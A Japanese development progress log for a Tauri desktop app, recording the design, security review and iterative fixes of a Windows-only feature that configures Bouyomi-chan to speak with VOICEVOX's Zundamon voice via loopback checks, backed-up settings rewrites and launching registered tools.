Windows/macOS 両対応の器のみ**を作る。**実際の連携実行（検出・設定書換・疎通テスト・Rust コマンド・`ureq`・ループバック
通信）は 032b で有効化**し、032a では**何も実行しない**（同意/免責は表示のみ、実行画面は「準備中」の器）。027/031 と
同じ低リスク方針（外部通信・外部設定書換・新規依存・capability・CSP・DB を一切変更しない）。

#### 親設計 032 のどの決定に基づくか

- 決定 5（UI/UX）: 一覧→詳細→同意→実行の遷移。初回は棒読みちゃん×VOICEVOX の 1 連携のみ・TTS 半分に限定。
- 決定 2（対応OS）: 枠組みは両OS対応、連携ごとに OS 対応可否メタデータ＋OS バッジ、非対応 OS は「ワンクリック設定」無効化。
- 決定 4（per-integration）: TS 側 `features/rakuraku/` に静的レジストリ。ガイド手順は**実行せずデータとして UI に返す**。
- 決定 1・ライセンス: 同意画面で新規DL可否・設定上書き可否・免責・**ずんだもんクレジット義務**（"VOICEVOX:ずんだもん"）を明示。

#### (1) 静的レジストリ（型・初期エントリ）

- `features/rakuraku/integrationRegistry.ts` を新規作成。`tutorialSteps.ts` に倣い**型＋`readonly` 配列**で定義し、
  **表示専用データのみ・実行コードなし**。型: `Integration`（`id`/`title`/`summary`/`benefits`/`osAvailability`/
  `requiredComponents`/`prerequisites?`/`consent`/`steps`/`executable`）、`OsAvailability`（`"windows"|"macos"|"both"`）、
  `RequiredComponent`（`name`/`officialUrl?`/`setup`/`note?`）、`ComponentSetup`（`"guided"|"auto"`）、
  `IntegrationConsent`（`allowsDownload`/`allowsConfigOverwrite`/`disclaimer`/`creditNotice`）、
  `IntegrationStep`（`kind`/`label`/`description`）。ヘルパ `osAvailabilityLabel` / `supportedOsName` / `isOsSupported`
  （`hostOs===null` は「不明＝安全側で非対応扱い＝無効化」）。
- **初回エントリ 1 件**: `id:"bouyomi-voicevox"` / `osAvailability:"windows"` / `executable:false`。
  必要部品＝VOICEVOX・SAPI For VOICEVOX（32bit 注記・配布元 URL は 032b で確定するため省略）・棒読みちゃん（すべて guided）。
  consent＝`allowsDownload:false`（自動DLせず公式誘導のみ）／`allowsConfigOverwrite:true`（棒読み設定のみ・バックアップ
  前提／実装は 032b）／免責文／ずんだもんクレジット義務。`steps`＝検出/導入準備/設定書換/音声登録/疎通テストの**表示用のみ**。
- `officialUrl` は**プレーンテキスト表示のみ**（032a は開かない。開く導線 `open_url` と URL の最終確認は 032b）。

#### (2) 画面（4 段の管理方式）

- `screens/rakuraku-tools/RakurakuToolsScreen.tsx` ＋ `.module.css` を新規作成。props は `{ hostOs }` のみ。
- **4 段（一覧→詳細→同意→実行）は `Screen` union を増やさず、画面内の判別可能ユニオン local state で管理**
  （`type View = {stage:"list"} | {stage:"detail";id} | {stage:"consent";id} | {stage:"execution";id}`）。
  `types.ts` の `Screen` と内部識別子 `rakuraku-tools` は不変。段間の戻りは画面内で完結（上位遷移は常時表示の Header が担う）。
- 一覧: 連携カード＋OS バッジ。非対応 OS は「この機能は◯◯でご利用いただけます」を補足（カードから詳細へは遷移可）。
- 詳細: summary/benefits・必要部品・前提・OS バッジ。主 CTA「ワンクリック設定」は `executable && OS対応` のときのみ活性。

#### (3) OS バッジと非対応時の無効化

- OS バッジは `osAvailability` を色分け（windows=info / macos=accent / both=ok）。生 hex なし・すべて role トークン。
- 現在 OS は既存 `useHostOs()`（`host_os` コマンド・新規追加なし）を App から prop で受ける。`isOsSupported` で判定し、
  `hostOs===null`（判定前/失敗）も安全側で非対応＝無効化。棒読み×VOICEVOX は mac で「ワンクリック設定」無効＋補足表示。

#### (4) 器に留めた範囲（executable:false / 032b 待ち）と同意/実行の確認導線

- 主 CTA は仕様どおり `executable && OS対応` で厳密にゲート → `executable:false` のため 032a では**全 OS で無効**。
- そのままだと同意/実行の器がどの OS でも到達不可になり 032a 完了条件（実行画面が「準備中」の器であることの確認）を
  満たせないため、詳細画面に**読み取り専用の「設定の流れ・同意内容を確認する（準備中プレビュー）」導線**を追加し、
  詳細→同意→実行（準備中）を**非実行で辿れる**ようにした（ユーザー了承済み。動作確認は Windows VM で実施）。
- 実行画面は steps を**全ステップ「待機」**の進捗リストで描画し「準備中（Windows で 032b 実装後に有効化）」を表示する器。
  **invoke・タイマー・副作用なし**（同意の「同意する」も画面遷移のみ）。032b で `executable:true` 化＋主 CTA 配線予定。

#### (5) 導線の差し替え

- `headerSections.ts`: `rakuraku` エントリを `implemented:false → true`（コメント追記）。ComingSoon を回避し本画面へ。
  `comingSoonDescription` は implemented=true では未使用のため残置（最小差分）。
- `App.tsx`: import 追加＋描画分岐に `{screen === "rakuraku-tools" && <RakurakuToolsScreen hostOs={hostOs} />}` を追加
  （既存 `hostOs`（L38）を流用）。ComingSoon（`obs-effects`）は現状維持。

#### セキュリティ（docs/security.md 準拠）

- **frontend のみ**の変更。OS/ファイル/プロセス操作・外部通信を追加せず（§1/§2/§4/§5）、新しい Tauri command /
  capabilities / 依存を追加していない（§3/§10）。外部リソースを読み込まず `csp: null` 不変（§CSP）。
- 同意/免責テンプレは**表示のみ**でこの段階では何も実行しない。ずんだもんのクレジット義務（"VOICEVOX:ずんだもん"）を明示。
- `docs/security.md` / `docs/product.md` の改訂は 032b（security-review と同時）で行うため本タスクでは触れていない。

#### 検証

- `git diff --stat` / `git status --short` = 変更は frontend のみ（`App.tsx` / `headerSections.ts` の 2 変更＋新規 2 ディレクトリ
  `features/rakuraku/` `screens/rakuraku-tools/`）。`src-tauri` / capabilities / `tauri.conf.json` / `Cargo.*` / `package.json` /
  `pnpm-lock.yaml` に変更なし（grep で 0 件）。
- 新規 `RakurakuToolsScreen.module.css` に生 hex/rgba なし（grep 0 件・すべて `var(--...)`）。
- `pnpm --filter ./apps/desktop typecheck` = pass（exit 0）。`pnpm --filter ./apps/desktop lint` = pass（exit 0）。
- 実機表示（`pnpm --filter ./apps/desktop tauri dev`）はユーザー環境で目視確認予定（mac／動作確認は Windows VM）:
  らくらくツール設定が実画面になり ComingSoon でない／一覧に OS バッジ・棒読み×VOICEVOX が mac で「ワンクリック設定」
  無効＋「Windows でご利用いただけます」／詳細・同意（新規DL/設定上書き/免責/ずんだもんクレジット義務）表示／実行画面が
  「準備中（032b で有効化）」の器（何も実行しない）／ライト・ダーク両テーマで破綻しない。

#### 未完了・032b へ持ち越し

- 検出・設定書換・疎通テストの実装、Rust `rakuraku` ドメイン（scan/configure/verify）・`ureq` 追加・ループバック通信。
- 主 CTA「ワンクリック設定」の活性化（`executable:true` 化）と実行フローの配線、公式 URL を開く導線（`open_url`）。
- SAPI For VOICEVOX / 棒読みちゃんの配布元 URL・入手手順の最終確認、`docs/security.md` / `docs/product.md` 改訂・security-review。

#### 変更ファイル

- 新規: `apps/desktop/src/features/rakuraku/integrationRegistry.ts` /
  `apps/desktop/src/screens/rakuraku-tools/RakurakuToolsScreen.tsx` /
  `apps/desktop/src/screens/rakuraku-tools/RakurakuToolsScreen.module.css`。
- 変更: `apps/desktop/src/components/headerSections.ts` / `apps/desktop/src/App.tsx` / `docs/progress.md`（本節）。

### デザイン改訂（032a 追加対応・同日）

ユーザー指摘（「全体的にデザインがダサい・詳細が読みにくい」）を受け、一覧/詳細のレイアウトを刷新。実行ロジック・
境界（frontend のみ・外部リソースなし・`csp:null` 不変・新規依存/コマンドなし）は不変。

- **レジストリ**: `Integration` に `icon`（絵文字グリフ・暫定 🎙️。将来ローカル画像へ差し替え可）を追加。`title` を
  「配信コメントをずんだもんの声で読ませる」、`summary` を「棒読みちゃんとVOICEVOXで連携し、棒読みちゃんが読み上げる
  声をずんだもんにします。」にコピー修正。
- **一覧カード**: 左にアイコンタイル、右に太字・大きめのタイトル＋薄色サマリ＋「対応OS＋OS アイコン」、右下に
  「詳細を見る →」ボタン（カード全体クリックを廃止しボタンに限定）。
- **詳細**: ヘッダーをアイコン＋タイトルに。対応 OS バッジ（Windows専用）を右寄せ。導入後イメージの**動画プレビュー枠**
  （中央寄せ・幅 78%・16:9 のプレースホルダ。動画は後で差し込み。ファイル読込なし）。「設定すると何ができるか／
  できること／必要なもの／前提」を**1 枚のカードに統合**（見出し＋区切り線で可読性を上げ、複数枠を廃止）。
- **OS アイコンはインライン SVG**（Windows/Apple・`Header.tsx` と同じ作法・currentColor でテーマ追従）。生 hex/rgba なし。
- 検証: `typecheck` / `lint` = pass。module.css 生 hex 0 件。変更は frontend の rakuraku 3 ファイルのみ（Rust/capabilities 不変）。

### デザイン微修正（032a 第2弾・同日）

可読性・収まりのユーザー指摘を受けた追加調整。実行ロジック・境界（frontend のみ・外部リソースなし・`csp:null`・
新規依存/コマンドなし・Rust/capabilities 不変・生 hex なし）は不変。

- **一覧カード**: 「詳細を見る」ボタンを独立行にせず、`.card` を **[アイコン][本文 flex:1][ボタン列 下寄せ]** の 3 カラム
  flex に変更（`.cardMain`/`.cardFooter` 廃止・`.cardAction` 追加）。カード高さ＝本文で、ボタンは本文の右下に収まる。
- **詳細の説明カード**: 横線（ディバイダー）を廃止し**余白で区切る**（`.infoStack` の gap、`.infoBlock` の border/padding 撤去）。
  見出しを大きく（`.infoSubTitle` 13→16px・h4→h3）。「設定すると何ができるか」と「できること」の重複を解消し
  **「できること」1 つに統合**（`.infoTitle`/`.infoText` の summary 段落を撤去）。`benefits` を**配信への影響のみ**に
  書き換え（アプリ機能説明・クレジット確認の項目を削除）。
- **主 CTA**: 「ワンクリック設定」→**「確認画面に進む」**（primary・右下）に変更し consent へ遷移。準備中プレビュー導線
  （`.previewLink`）と無効化理由テキストは撤去。`.ctaArea` を右寄せに。**第1弾の「厳密ゲート」判断を上書き**したが、
  実行は依然 execution 画面の「準備中」で止まり invoke/副作用なし（器の境界は不変）。OS 対応は詳細の「Windows専用」バッジで表示。
- **同意画面**: クレジットカードの枠線を他カードと統一（`.creditPanel` の `--warn-border-strong` 特別枠を撤去）。代わりに
  **クレジット表記を赤文字**（`.creditHeading`/`.creditText` = `var(--danger)`）で強調。「同意する」ボタンを右下に配置。
- 検証: `typecheck` / `lint` = pass。module.css 生 hex 0 件。変更は frontend の rakuraku 3 ファイル（screen 2 + registry）のみ。

### 免責文の共通化（032a・同日）

免責事項を全連携で使い回せるよう共通化。`integrationRegistry.ts` に `export const COMMON_DISCLAIMER`（連携非依存の
汎用文面。032 のセキュリティ方針＝自己責任／変更前バックアップ・可逆／自動DL・実行しない／不可逆・昇格変更は誘導のみ）を
新設し、`IntegrationConsent` から `disclaimer` フィールドを撤去、bouyomi エントリの個別免責文も削除。ConsentView は
`COMMON_DISCLAIMER` を表示。棒読み固有情報（棒読み設定のみ・バックアップ／SAPI 誘導）は既存の `allowsConfigOverwrite`
表示文と `prerequisites` で引き続き伝わる。`creditNotice`（ずんだもん固有）は連携固有のまま。境界不変（frontend の
registry＋screen のみ・Rust/依存/CSP 不変・生 hex なし）。`typecheck` / `lint` = pass。

## 2026-07-14 (032b 棒読みちゃん×VOICEVOX 連携・Windows 専用・098 で実機検証)

### 完了したこと

らくらくツール設定の最初の連携として **棒読みちゃん×VOICEVOX** の実行ロジックを実装した。032a の画面枠組み（器）に、
新規 Rust `rakuraku` ドメイン（検出・設定書換・疎通テスト・公式DL誘導）を差し込み、`executable:true` 化して実行画面を
ライブフローに配線した。範囲は 032 決定どおり **TTS 半分**（棒読みちゃんがずんだもんの声で喋るまで）。**棒読みちゃん依存
のため Windows 専用**。実処理は `#[cfg(windows)]` に閉じ、非 Windows は「未対応」を返す。docs/security.md §1/§5/§10/
capabilities 方針に**限定的に抵触**するため、解禁範囲を守り security.md/product.md を改訂・security-review を実施した。

**⚠️ Windows コードは未検証**（mac で `#[cfg(windows)]` 分岐は `cargo check` 対象外＝未コンパイル・実機未確認）。
028/013/019/021 の前例に倣い**未検証のまま main に入れ、098（Windows ARM64 VM）で初コンパイル・初 E2E**する。

#### (1) Rust `rakuraku` ドメイン（新規 vertical slice）

- `src-tauri/src/rakuraku/{mod,commands,service,model}.rs` ＋ `integrations/{mod,bouyomi_voicevox}.rs`。永続化しないため
  `repository.rs` は持たない（バックアップはファイルのみ・SQLite テーブル追加なし）。
- 共通トレイト `Integration`（`id` / `scan → ScanResult` / `configure → ConfigureResult` / `verify → VerifyResult` /
  `official_page(component) → Option<&'static str>`）。ガイド手順は実行せず scan の結果データとして UI に返す。
  `service::find(id)` が登録済み実装一覧（`registry()`）から id で解決（連携追加＝1 行追加）。未知 id は `NotFound`。
- コマンド **4 本**を `lib.rs` の `invoke_handler` に登録: `rakuraku_scan_integration(id)` /
  `rakuraku_configure_integration(id)` / `rakuraku_verify_integration(id)` / `rakuraku_open_official_page(id, component)`。
  ※ 公式ページを開く導線は 032 の「open_url 相当」方針をユーザー承認のうえ**限定コマンド1つ**で実現（3→4 コマンド）。
- 実処理は `bouyomi_voicevox.rs` の `#[cfg(windows)] mod imp` に閉じ、非 Windows は各メソッドが `*::unsupported()` を返す
  （`ScanResult`/`ConfigureResult`/`VerifyResult` に `unsupported()` コンストラクタ）。model は ts-rs で
  `src/features/rakuraku/bindings/` に export（`gen:bindings` = `cargo test export_bindings` で生成）。

#### (2) 検出（scan・読み取り専用）

- VOICEVOX/棒読みちゃんの導入有無（既知パスの存在確認）、SAPI 音声「VOICEVOX」登録有無（`HKLM\...\Speech\Voices\Tokens`
  を `KEY_READ` で列挙・32bit/64bit 両ビュー）、VOICEVOX ENGINE 稼働（`ureq` で `127.0.0.1:50021/version` 疎通）。
- 書込・外部通信なし（ループバック疎通のみ）。best-effort（`Option<bool>`）で失敗は丸め、フルパス/OS エラー非露出（§9）。

#### (3) 設定書換（configure・バックアップ先取り・§5 解禁）

- **棒読みちゃん自身の設定のみ**を対象に、書換前に `app_data_dir/rakuraku-backups/bouyomi-voicevox/<TS>/` へ
  **タイムスタンプ付きバックアップ**（`<TS>`＝コロンを含まないファイル名安全形式）。**バックアップ失敗時は書換しない**（先取り）。
- 書換対象パスが**インストールフォルダ配下であることを `starts_with` で再検証**してから書く（想定外パスは書かない）。
  Socket 連携 ON・声質＝`VOICEVOX:ずんだもん` を設定。**対応キーが見つからなければ書換せず `Skipped`**（設定を壊さない）。
- 可逆（完全コピー）。復元 UI は作らない（対象外）。`backupName` は「タイムスタンプ/ファイル名」のみ返す（フルパス非露出）。

#### (4) 導入・SAPI 登録の誘導（guided・自動実行しない）

- 不足部品は公式DLページを開く（`rakuraku_open_official_page` → Rust 側固定定数 URL → `validate_http_url` → opener Rust API）。
  frontend は id と部品名（`voicevox`/`bouyomichan`）だけ渡し **raw URL を渡さない**。SAPI For VOICEVOX は配布元 URL 未確定
  のため `None`（開く導線を出さない・誤 URL を開かせない）。SAPI 登録は付属ツールへ誘導（自動化しない）。

#### (5) 検証（verify・ループバックのみ・§1 解禁）

- VOICEVOX 50021 ヘルスチェック（`ureq`）＋棒読みちゃんへ **TCP `127.0.0.1:50001`** にテスト文「接続テストなのだ」を
  既知バイナリプロトコル（コマンド 0x0001＋速度/音程/音量/声質/文字コード/本文長/本文・リトルエンディアン）で送信
  （`std::net::TcpStream`・新規依存なし）。接続＋書込成功を返す（実際に鳴るかは 098 実機で耳視）。

#### (6) 依存追加（`ureq`・§10）と capability 非追加

- `ureq = { version = "2", default-features = false }` を **`[target.'cfg(windows)'.dependencies]` に追加**（理由コメント明記）。
  reqwest は tokio/async を引き込み同期構成と不整合のため不採用。用途は `127.0.0.1:50021` の**平文ループバックのみ**で
  TLS 不要 → `default-features=false` で rustls/TLS を外す。**Cargo.lock 新規は `ureq` 1件のみ**（rustls/ring/openssl なし）。
  windows-gate のため **macOS ビルドには HTTP クライアントを載せない**（ureq 自体の初コンパイルは 098）。
- 既存 `windows` クレートに **feature `Win32_System_Registry` を追加**（SAPI トークン読取列挙用・feature 追加のみ）。
- **Tauri capability は追加しない**（`ureq`/`std::net` は IPC/ACL 対象外・opener は Rust API で ACL 不要・frontend から
  ネットワークを直接叩かせない）。`capabilities/default.json` / `tauri.conf.json` に差分なし。`csp: null` 不変。

#### (7) 032a 実行画面への配線

- `features/rakuraku/rakurakuApi.ts`（invoke ラッパ 4 本）＋ `types.ts`（bindings バレル）を新設（既存 `toolApi.ts` に倣う）。
- `integrationRegistry.ts`: 棒読み×VOICEVOX を `executable: false → true`。
- `RakurakuToolsScreen.tsx` の `ExecutionView`: 「準備中・全ステップ待機」の器を、`executable && OS対応` のとき
  **scan → configure → verify を順に invoke** するライブフローに差し替え（進捗は逐次戻り値で管理・Tauri event 不使用）。
  検出結果（部品導入状況・50021 稼働）表示、不足部品の公式ページを開く導線（prepare）、書換結果（バックアップ取得・再起動要否）、
  疎通結果を各ステップに表示。非対応 OS（mac）は実行せず「Windows でご利用いただけます」を表示（多重防御）。生 hex なし。

#### セキュリティ方針の改訂（security-review と同時）

- `docs/security.md`: 新章「らくらくツール設定（外部アプリ連携）方針」（5 点）を追加。§1/§5 に例外注記、「レビュー必須条件」に
  本連携（ループバック通信・外部設定書換・`ureq` 追加）を追加。`### 032b ...` に security-review 結果と未検証注記を記載。
- `docs/product.md`: 「設定ファイルの自動上書き」に、らくらくツール設定に限る例外（同意＋バックアップ＋security-review・可逆）を追記。

#### security-review 結果（実施済み・必須）

- 判定＝**問題なし**（修正必須なし）。確認済み: 外部通信＝ループバックのみ（TLS 追加なし・windows-gate）／公式ページは固定定数 URL・
  frontend は raw URL 非受領／書換はバックアップ先取り・棒読み設定のみ・インストールフォルダ配下再検証・可逆／レジストリは読み取り専用
  （`KEY_READ` のみ・RAII クローズ）／capability・CSP 不変／未知 id/component は NotFound・エラー丸め・app_logs を増やさない。
- 後回し（098 で確認）: `set_xml_text` 素朴置換の一意性／バックアップ世代蓄積（復元 UI は対象外）／`RegEnumKeyExW` 名前バッファ上限。

#### 検証結果（本タスク＝macOS 上・非退行）

- `cd apps/desktop/src-tauri && cargo check` → **成功**（非 Windows 経路は `unsupported` を返し非退行。`#[cfg(windows)] mod imp`
  は macOS では**コンパイルされない**）。
- `pnpm --filter ./apps/desktop gen:bindings` → rakuraku bindings 生成（6 型）。`typecheck` / `lint` → 成功。
- 差分は Rust `rakuraku/`・Cargo.toml/lock・lib.rs・frontend rakuraku（api/types/registry/screen/css）・docs のみ。
  `capabilities/default.json` / `tauri.conf.json` 変更なし。module.css 生 hex 0 件。

#### 未検証範囲（本タスクの完了条件に含めない・098 Windows Build へ持ち越し）

- `#[cfg(windows)] mod imp`（scan/configure/verify・SAPI レジストリ読取・`ureq` 50021・`TcpStream` 50001・棒読み設定書換）は
  **macOS で `cargo check` 未走・実機未確認**。`windows` 0.58 の `Win32_System_Registry` API・`ureq` 2.x API・Socket バイナリ
  プロトコル・棒読みちゃん設定スキーマ・配布元 URL は **机上整合＋`// 098-SPIKE` 仮実装のみ**。098 が初コンパイル・初 E2E。
  098 でコンパイルエラー/不具合が出たら **098 側で最小修正**する前提。
- **098 で確認**: Windows ARM64(VM) の `cargo check` / `cargo clippy`（rakuraku Windows 分岐 初コンパイル）／実機で VOICEVOX・
  SAPI For VOICEVOX・棒読みちゃん導入 → ワンクリック設定 → 棒読み設定書換（バックアップ取得）→ 疎通テストでずんだもんが喋る／
  検出が正しく効く（未導入はガイド・導入済みは設定/テストへ）／バックアップから手動復元でき書換が可逆であること。
- **スパイクで 098 に確定を委ねた項目**: ①棒読みちゃん設定ファイルの実体（場所・ファイル名・スキーマ・「Socket 連携 ON」
  「声質＝VOICEVOX:ずんだもん」の対応キー・書換後の反映=再起動要否）②VOICEVOX/棒読みちゃんの既知インストールパス・
  アンインストールレジストリキー・SAPI トークン列挙条件 ③SAPI For VOICEVOX の配布元 URL/バージョン/32bit 入手手順
  ④VOICEVOX/棒読みちゃん公式配布元 URL の最終確認 ⑤Socket プロトコルの声質フィールドの意味（アプリ現在設定を使う値）。

#### やらないこと（維持）

- インストーラ/zip の自動DL・自動実行、SAPI 音声登録の自動化（誘導のみ）／棒読みちゃん以外の外部アプリ設定の書換・SAPI
  レジストリ等の不可逆・昇格変更／設定解除・状況管理・更新・復元 UI（バックアップは取るが restore UI なし）／コメントビューア連携／
  ループバック以外の通信・telemetry／macOS/Linux での連携実行（`#[cfg(windows)]` 以外は「未対応」）／`ureq` 以外の新規 crate・
  Tauri capability の追加。

#### 変更ファイル

- 新規: `apps/desktop/src-tauri/src/rakuraku/{mod,commands,service,model}.rs` /
  `apps/desktop/src-tauri/src/rakuraku/integrations/{mod,bouyomi_voicevox}.rs` /
  `apps/desktop/src/features/rakuraku/{rakurakuApi.ts,types.ts,bindings/*}`。
- 変更: `apps/desktop/src-tauri/src/lib.rs`（`mod rakuraku;`＋4 コマンド登録） /
  `apps/desktop/src-tauri/Cargo.toml`（`ureq` windows-gate 追加＋理由・`Win32_System_Registry` feature 追加）＋ `Cargo.lock` /
  `apps/desktop/src/features/rakuraku/integrationRegistry.ts`（`executable:true`） /
  `apps/desktop/src/screens/rakuraku-tools/RakurakuToolsScreen.tsx`＋`.module.css`（ExecutionView ライブフロー配線） /
  `docs/security.md`（新章＋§1/§5 例外＋レビュー必須条件＋032b 節） / `docs/product.md`（自動上書き例外） / `docs/progress.md`（本節）。

### 032 追加対応（詳細画面の YouTube デモ動画埋め込み ＋ 非対応 OS ガード・同日）

032b の詳細画面（`RakurakuToolsScreen.tsx` の `DetailView`）への 2 点の UI 追加。**frontend のみ**（registry＋screen＋css）。
Rust/Cargo/capabilities/`tauri.conf.json`（`csp: null`）不変・新規依存/command/capability なし。

- **(1) YouTube デモ動画のアプリ内埋め込み**: 動画をアプリに同梱すると容量が増えるため、YouTube 埋め込み方式を採用
  （ユーザー選択＝インライン再生）。`Integration` に `demoVideoId?: string`（11 桁 ID）を追加し、`DetailView` の
  `.videoPlaceholder` を、ID があり `^[A-Za-z0-9_-]{11}$` に一致するときだけ **youtube-nocookie の iframe**
  （`https://www.youtube-nocookie.com/embed/<id>?rel=0`）に差し替え（不正/未設定は「準備中」プレースホルダにフォールバック）。
  iframe 属性は最小・安全側（`referrerpolicy=strict-origin-when-cross-origin`・`allow=encrypted-media; fullscreen;
  picture-in-picture`・`loading=lazy`・`title`）。CSS `.videoFrame`（16:9・placeholder と同幅）。**現時点で実 ID は未設定**
  （bouyomi エントリにコメントの TODO を置いた）＝実 ID を入れるとインライン再生される。
- **(2) 非対応 OS で「確認画面に進む」を無効化**: `DetailView` に `hostOs` を渡し、`isOsSupported` で判定して
  ボタンを `disabled`、下に小さめ赤文字「(このOSでは利用できません)」を表示（CSS `.ctaDisabledNote`＝`var(--danger)`・11px・右寄せ）。
  `ExecutionView` の Windows 専用ガードと合わせ多重防御。
- **セキュリティ**: YouTube iframe 埋め込みは §1（外部通信）/§CSP（外部リソース非読込）に**限定的に抵触**するため、
  `docs/security.md` の CSP方針に「例外（YouTube デモ動画埋め込み）」を明記＋レビュー必須条件に「外部コンテンツの埋め込み」を追加＋
  `### 032 追加対応` 節に security-review 結果を記録。**security-review 実施＝判定「問題なし」**（youtube-nocookie・ID の正規表現ガード・
  最小 iframe 属性・IPC 非接触・capability/csp 不変）。留意点（ID 設定後に `tauri dev` でフレーム内操作のウィンドウ遷移/ポップアップ有無を確認・
  必要なら sandbox 追加）を docs に明記。`docs/product.md` は変更なし（セキュリティ面は security.md で担保）。
- **検証**: `typecheck` / `lint` = pass。`RakurakuToolsScreen.module.css` 生 hex/rgba 0 件。実機目視（`tauri dev`）は
  実 ID 設定後にユーザー環境で確認予定（mac で「確認画面に進む」無効＋赤文字／対応 OS で活性）。
- **変更ファイル**: `apps/desktop/src/features/rakuraku/integrationRegistry.ts` /
  `apps/desktop/src/screens/rakuraku-tools/RakurakuToolsScreen.tsx`＋`.module.css` / `docs/security.md` / `docs/progress.md`（本節）。

### 追加修正（無効化 primary ボタンの灰色化・同日）

非対応 OS で `disabled` にした「確認画面に進む」が有効時とほぼ同じ見た目で非活性だと分かりにくかったため、共有 `Button`
プリミティブの無効化スタイルを改善（`apps/desktop/src/components/primitives.module.css` のみ）。原因は `.primary:disabled` が
`opacity: 0.88` だけで primary 色を保持し、`.primary:hover { filter: brightness }` が無効時にも効いていたこと。

- `.primary:disabled`（＋`:disabled:hover`）を **灰色**（背景 `var(--control-bg)`・文字 `var(--text-faint)`）＋ `filter: none`
  （ホバー明転を打ち消し）に変更。`.btn:disabled` に `cursor: not-allowed` を追加。role トークンのみ・生 hex/rgba なし。
- 共有プリミティブのため無効化される primary ボタン全て（確認画面に進む＝`!supported`／設定を実行する＝実行中／ツール・プリセット保存＝保存中）に
  一貫適用（いずれも正当な無効状態で灰色化は標準挙動＝回帰なし）。secondary は対象外。赤文字「(このOSでは利用できません)」と併せ非活性が明確化。
- セキュリティ影響なし（CSS のみ）。`typecheck` / `lint` = pass。生 hex 0 件。実機目視は `tauri dev`（mac で「確認画面に進む」が灰色・ホバーで明るくならない／有効時は従来どおり）でユーザー確認予定。
- 変更ファイル: `apps/desktop/src/components/primitives.module.css` / `docs/progress.md`（本節）。

### 032b 修正（起動検出＋自動起動の必須化・SAPI 導線・棒読み検出堅牢化・halt-on-failure）

初回 032b 実装がワンクリック設定として実用にならなかった 4 点を修正（ユーザー報告）。**「起動検出＋既導入アプリの
自動起動」を必須スコープに格上げ**し、親設計 032 決定 3・`docs/security.md`「らくらくツール設定（外部アプリ連携）方針」を改訂。
**自動DL/インストール/SAPI 自動登録は引き続きしない**（誘導のみ）。

- **問題1 SAPI 導線復活**: SAPI For VOICEVOX は 3 部品連鎖の必須部品だが配布元 URL 未確定（098-SPIKE）で導線が 3 層封印
  されていた。配布元を **GitHub 公式リリース `shigobu/SAPIForVOICEVOX`** に確定し、`official_page("sapi")=Some` /
  `has_official_page=true` / registry `officialUrl` を設定。導入準備ステップに「公式ページを開く」ボタンが出る。
- **問題2 棒読み検出の誤判定**: zip 展開型で任意フォルダに置かれると固定 2 パスでは未検出だった。**起動中プロセスの
  exe パス（sysinfo・読み取り専用）を最優先**し、無ければ展開先候補（Desktop/Downloads/ユーザーフォルダ/ドライブ直下の
  `BouyomiChan*`）を探す。`configure` の設定ファイル解決も同じ install_dir を使う。
- **問題3 起動検出＋自動起動**: `ScanResult` に `bouyomiRunning`（50001 connect のみ）を追加し UI に両アプリの起動を提示。
  新コマンド `rakuraku_launch_component(id, component)` ＋ `process::service::spawn_detached`（shell 非経由・検証済み絶対パス・
  PID 管理外）で **既導入・未起動アプリを自動起動**。frontend は未起動部品にだけ呼び、起動を scan 再ポーリングで待つ（VOICEVOX
  エンジンは起動に数秒）。同意画面に自動起動を明示（`IntegrationConsent.allowsAutoLaunch`）。
- **問題4 halt-on-failure**: `runAll` を「前段が失敗したら中断し、以降を『未実行（blocked）』にする」逐次ゲートに変更
  （verify の常時実行を撤回）。ステップ順は scan→prepare→configure→register→**launch**→verify。新 StepRunState `blocked`＋CSS。
- **セキュリティ**: security-review 実施＝**判定「問題なし」**（capability/CSP/依存 差分ゼロ・自動起動は既導入アプリのみ shell 非経由・
  検出は読み取り専用・frontend は固定語のみ）。詳細は `docs/security.md`「### 032b 修正 …」節。
- **検証**: mac で `cargo check`（非 Windows）/ `typecheck` / `lint` = pass。`gen:bindings` 再生成（`ScanResult` に `bouyomiRunning`・
  新規 `LaunchResult.ts`）。**Windows `imp`（launch/spawn_detached/検出/bouyomi_running）は mac では未コンパイル**＝実コンパイル・
  実機 E2E は 098 が初。
- **098 へ持ち越し**: 棒読み検出候補の網羅性・プロセス名、自動起動 exe パス、**棒読み起動中に configure したときの設定
  上書き有無**（launch を configure の後に置き未起動時のみ起動＝新規起動が新設定を読む前提。既起動時は要確認）、VOICEVOX 起動待ち時間。
- **変更ファイル**: `src-tauri/src/rakuraku/integrations/bouyomi_voicevox.rs`・`model.rs`・`commands.rs`・`integrations/mod.rs` /
  `src-tauri/src/process/service.rs`（`spawn_detached`）/ `src-tauri/src/lib.rs`（コマンド登録）/
  `src/features/rakuraku/{integrationRegistry.ts,rakurakuApi.ts,types.ts,bindings/ScanResult.ts,bindings/LaunchResult.ts}` /
  `src/screens/rakuraku-tools/RakurakuToolsScreen.tsx`＋`.module.css` /
  `docs/{security.md,product.md,progress.md,tasks/032-rakuraku-auto-setup-design.md,tasks/032b-bouyomi-voicevox-integration.md}`。

### 032b 修正2（ツール管理登録前提化・広域走査/sysinfo 廃止・管理付き spawn へ一本化）

「032b 修正」で入れた **FS 広域走査（Downloads/ドライブ直下等の `read_dir`）＋sysinfo プロセス列挙**による導入検出/自動起動を
撤回し、**対象ツール（VOICEVOX / 棒読みちゃん）が「ツール管理」に登録済みであることを前提**にする方式へ変更（設計 D1〜D5・
docs は先行更新済み）。攻撃面（同名 exe 偽装の自動起動）を排除し、起動を既存基盤へ一本化した。

- **Phase 1（照合・installed 判定）**: `process/service.rs::validate_launch_path` を `pub fn validate_executable_path`
  （クロスプラットフォーム）へ昇格。`rakuraku/service.rs::resolve_tool_for_component`（exe 名一致・大小無視・kind==Executable・
  非永続）を追加。`Integration` トレイトに `component_exe`（固定語→exe 名）を追加。`IntegrationCtx` に `tools: Vec<Tool>` を
  追加し commands 層が `DbState`→`tools::service::list` で注入。`detect_installed` を「登録済み＋パス有効」判定へ作り替え。
- **Phase 2（launch 一本化）**: `rakuraku_launch_component` を `component_exe`→`resolve_tool_for_component`→管理付き
  `process::service::spawn`＋`register`（`launch_tool` と同プリミティブ）へ改修（State は Tauri 注入・frontend invoke 不変）。
  **`spawn_detached` / `Integration::launch` / `imp::launch` / `LaunchResult::unsupported` を削除**。起動 PID は停止/監視対象に。
- **Phase 3（configure）**: `resolve_bouyomi_config(tools)` を「登録済み棒読みちゃん Tool の `executablePath` 親＝install_dir →
  `install_dir/SettingBase.xml`（098-SPIKE 仮）」へ作り替え。`starts_with(install_dir)`・バックアップ先取り・書換ロジックは不変。
